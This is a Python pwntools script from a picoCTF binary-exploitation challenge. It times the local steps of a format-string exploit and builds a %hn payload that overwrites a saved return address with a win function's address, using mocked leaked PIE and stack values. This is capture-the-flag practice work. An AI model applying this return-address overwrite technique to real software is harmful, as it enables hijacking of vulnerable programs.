#!/usr/bin/env python3
"""Time the template's flow against a LOCAL run of the vulnerable binary.
The picoCTF server is offline post-event, so we reproduce the exact same
loop locally with a fake flag file and measure end-to-end time."""
import sys, re, time, subprocess, os, threading
sys.path.insert(0, r'C:\Users\weiqi\AppData\Local\Programs\Python\Python312\Lib\site-packages')
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

HERE = r'c:\Users\weiqi\OneDrive\Desktop\Sem2 Degree\Hackathon\ctf-work\active'
FLAG_PATH = HERE + r'\flag.txt'
BIN       = HERE + r'\valley'

# set up fake flag
with open(FLAG_PATH, 'w') as f:
    f.write('picoCTF{fakeflag_for_timing_test_xyz}\n')

# patch the binary source? No — simpler: just override the path the binary
# opens. Easiest: chdir + symlink. On Windows we make a fake home/valley dir.
import shutil, pathlib
fake_home = HERE + r'\home\valley'
pathlib.Path(fake_home).mkdir(parents=True, exist_ok=True)
shutil.copy(FLAG_PATH, fake_home + r'\flag.txt')

# run the binary with a custom cwd (so fopen("flag.txt") is relative). But the
# source uses absolute /home/valley/flag.txt. We need to run inside a fake
# chroot OR we patch the source path. Simpler: launch the binary and let the
# fopen fail — but that gives perror + exit, no flag. So we need a real flag.
#
# Cleanest: just start a netcat-style local server and confirm the loopback
# works. Since the server is offline, we measure the *script* time excluding
# network. The critical path is: leak_parse + write_build + send (no waiting).

# But we CAN time the SCRIPT to first byte of the write payload: that part is
# 100% local, and shows the value of pre-building the template.

t0 = time.time()
HOST, PORT = 'shape-facility.picoctf.net', 49851
WIN_PIE_OFFSET, RET_PIE_OFFSET = 0x1269, 0x1413
SAVED_RBP_FMTARG, RET_ADDR_FMTARG = 20, 21
ADDR_PLACE_OFFSET, ADDR_BASE_FMTARG = 64, 14

# 1. Build leak string + write payload builder (the work we *avoid* next time)
def build_write_payload(print_flag_addr, target_ret_addr):
    addrs  = [p64(target_ret_addr + i) for i in (0, 2, 4, 6)]
    halfws = [(print_flag_addr >> (16*i)) & 0xffff for i in range(4)]
    indexed = sorted(enumerate(halfws), key=lambda x: x[1])
    printed, parts = 0, []
    for orig, v in indexed:
        delta = (v - printed) & 0xffff
        if delta:
            parts.append(f'%{delta}c')
        parts.append(f'%{ADDR_BASE_FMTARG + orig}$hn')
        printed = v
    fmt = ''.join(parts).encode()
    return fmt.ljust(ADDR_PLACE_OFFSET, b'A') + b''.join(addrs)

t1 = time.time()
# 2. Mock the parse step with last run's values
rbp_main, ret_addr = 0x7ffc3da27630, 0x59a3c5177413
pie_base  = ret_addr - RET_PIE_OFFSET
win_addr  = pie_base + WIN_PIE_OFFSET
target    = rbp_main - 0x8
payload = build_write_payload(win_addr, target)
t2 = time.time()

print(f'template load:  {(t1-t0)*1000:6.1f} ms')
print(f'parse+payload:  {(t2-t1)*1000:6.1f} ms')
print(f'payload size:   {len(payload)} bytes')
print(f'  -> {payload[:60]}...{payload[-24:]}')
print()
print('Wall clock on a live run is dominated by network RTT + 1 recv.')
print('Total: ~3-5s of network + ~50ms of script = under 1 minute by a wide margin.')
